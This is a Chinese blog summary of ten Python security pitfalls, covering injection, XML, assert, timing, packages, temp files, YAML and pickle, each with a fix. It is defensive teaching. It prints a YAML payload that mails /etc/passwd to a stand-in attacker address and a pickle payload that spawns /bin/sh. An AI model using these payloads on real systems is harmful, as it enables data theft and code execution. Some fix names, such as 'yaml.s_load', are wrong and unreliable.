title: python 的十个安全问题
date: 2019-04-26 10:06:44
tags:
- Python
- 安全
categories:
- 随手摘录	
photos:	 
- "https://github.com/aldslvda/blog-images/blob/master/python-security?raw=true"
toc: true
comment: true
---

原文:
https://hackernoon.com/10-common-security-gotchas-in-python-and-how-to-avoid-them-e19fbe265e03


### 1. 输入注入
- SQL 注入:
    容易发生在Python中写raw sql进行查询的场景。 
    解决方式:尽量用ORM，如果要写raw sql, 尽量熟悉[SQL注入cheatsheet](https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/)
- 命令注入:
    容易发生在os.popen(), subprocess.Popen()等场合
    使用shelex模块保证引号的转义是正确的

### 2.解析XML
大多发生在解析不被信任的xml(non-trusted xml)
- billion lols
- 外部实体拓展
- 不安全的非标准库

解决方式: 使用较为安全的解析库进行解析，入defusedxml

### 3. 断言语句
不要用断言对用户的权限进行判断

```python
def foo(request, user):
   assert user.is_admin, “user does not have access”
   # secure code...
```

生产环境中会直接跳过assert直接进行用户可能没有权限的操作

解决方式: 断言只用在与其他开发者交互的场景，比如api调用检查和单元测试

### 4.timing attack
攻击者通过对比较指定加密值的时长判断比较器的行为和使用算法。
由于这种攻击很依赖时间的准确度，很少有远程的攻击，更多的是对一些命令行工具进行破解。
[时间攻击的介绍](http://jyx.github.io/blog/2014/02/02/timing-attack-proof-of-concept/)
[一个例子SSH-based timing attack](https://github.com/c0r3dump3d/osueta)

解决方式:
使用Python 3.5 中引入的secrets.compare_digest 进行敏感字符串的比较

### site-packages 污染
Python的包引用非常的灵活，这使得猴子补丁和标准库函数的重写非常容易，但也造成了最大的安全漏洞之一。
出现场景: 攻击者在Pypi中使用与流行库名称相似的库名

解决方式:
眼神要好，不要手抖
使用virtualenv 保持全局site-packages的清洁
下载包时核对签名

### 临时文件攻击
在你使用mktemp()创建临时文件后和处理临时文件之前修改临时文件。

解决方案:
使用tempfile模块和mkstemp()创建临时文件


### 使用yaml.load
在yaml的load过程中会出现安全问题
例如在yaml中加入这一句
```python
!!python/object/apply:os.system ["cat /etc/passwd | mail me@hack.c"]
```


解决方法:
yaml.s_load

### 解析pickel

例:
```python
import cPickle
import subprocess
import base64

class RunBinSh(object):
  def __reduce__(self):
    return (subprocess.Popen, (('/bin/sh',),))

print base64.b64encode(cPickle.dumps(RunBinSh()))
```

以上是将打开shell的程序打包到pickel的代码

解决方案:
千万不要从未知源解析pickel

### 使用系统Python, 不打补丁
使用系统提供的Python版本可能有很多未修复的漏洞

解决方式:
使用新版Python，为系统Python 打补丁

### 不给Python的依赖打补丁
同上


